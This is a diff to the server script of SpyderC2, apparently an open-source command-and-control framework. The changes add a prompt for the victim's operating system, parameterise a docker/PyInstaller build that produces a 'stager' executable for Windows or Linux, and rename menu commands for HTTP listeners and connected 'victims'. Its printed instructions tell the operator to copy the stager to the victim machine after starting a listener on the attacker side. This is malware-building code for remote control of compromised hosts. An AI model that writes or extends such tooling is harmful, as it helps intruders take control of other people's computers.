@@ -35,7 +35,7 @@ def display_main_help_menu():
 	print(' --------------------------------------')
 	print('|          SERVER HELP MENU            |')
 	print(' --------------------------------------')
-	commands = {'http':'Starts a new http listener.' , 'listeners': 'List existing http listener running.', 'kill': 'Kill the http listener running', 'generate': 'generates the stager in exe format in shared/tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
+	commands = {'http':'Starts a new http listener.' , 'listeners': 'List existing http listener running.', 'kill_listeners': 'Kill the http listener running', 'generate': 'generates the stager in exe format in shared/tmp folder', 'victims': 'Show the currently connected victims', 'use <VICTIM ID>' : 'Interact with connected victims','exit': 'exit the program.'}
 
 	for command in commands.keys():
 		print(colored(command,'cyan') + " - " + commands[command])
@@ -44,12 +44,25 @@ def display_main_help_menu():
 def docker():
 	return os.path.isfile('/.dockerenv')
 
+def get_victim_os():
+	while True:
+		print(colored("Enter OS of victim - windows/linux",'cyan'))
+		os_name = str(input())
+		os_name = os_name.lower()
+		if os_name in ['windows','linux']:
+			return os_name
+		elif os_name in ['back','exit']:
+			return False
+		else:
+			print(colored("Sorry not supported os",'yellow'))
+			continue
+
 ## Stager.py has needs the server url where it will connect back and copies the new stager to tmp
 def fill_server_url():
-	print(colored("Enter server IP",'cyan'))
+	print(colored("Enter listener IP",'cyan'))
 	server_ip = str(input())
 
-	print(colored("Enter server port. Default is 8080",'cyan'))
+	print(colored("Enter listener port. Default is 8080",'cyan'))
 	server_port = str(input())
 
 	if server_port == '':
@@ -102,12 +115,18 @@ def delete_folder_contents(folder,server_logger):
 	            shutil.rmtree(file_path)
 	    except Exception as e:
 	        server_logger.info_log(f"Failed to delete {file_path}. Reason: {e}",'red')
+	        server_logger.info_log(f"Please clear the tmp directory manually and try again.",'red')
 	        return False
 
 	return True
 
 def generate_stager(server_logger):
 	
+	os_name = get_victim_os()
+
+	if not os_name:
+		return
+
 	## Convert to exe and save
 	if os.path.exists(os.path.join(PATH,'shared','tmp')):
 		if not delete_folder_contents(os.path.join(PATH,'shared','tmp'),server_logger): return
@@ -136,10 +155,11 @@ def generate_stager(server_logger):
 	
 	try:
 		if not docker():
-			subprocess.check_output('sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-windows ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
+			server_logger.info_log("Generating stager.. Please wait, this might take some time.")
+			subprocess.check_output(f'sudo docker run -v "$(pwd):/src/" cdrx/pyinstaller-{os_name} ', cwd=rf"{os.path.join(PATH,'shared','tmp')}",shell=True)
 			print(colored(f"exe dumped to {colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')}.Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe.",'green'))
 		else:
-			print(colored("\nPlease run the following command:"+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-windows','cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','cyan')+" directory on the host machine. The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')+". Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
+			print(colored("\nPlease run the following command: "+ colored('sudo docker run -v \"$(pwd):/src/\" cdrx/pyinstaller-'+os_name,'cyan')+" in "+colored('<path_to_SpyderC2>/data/shared/tmp','cyan')+" directory on the host machine. The stager will be generated in "+ colored('<path_to_SpyderC2>/data/shared/tmp/dist/windows','cyan')+". Copy it to your victim machine, once generated. Do run a HTTP server on attacker by running http command before executing stager.exe on victim."))
 	except subprocess.CalledProcessError as grepexc:                                                                                                   
 		print(colored(f"exe generation failed ","red"))
 
@@ -193,6 +213,7 @@ def main(args,db_object,server_logger):
 			else:
 				server_logger.info_log("Failed to start http listener. Something is running on that port.",'yellow')
 
+				## Attempts to kill the process running on that port
 				## killing with lsof doesn't work in docker
 				if not docker():
 					print(colored("Do you want to kill the process running on that port? Enter y or yes to do so.",'cyan'))
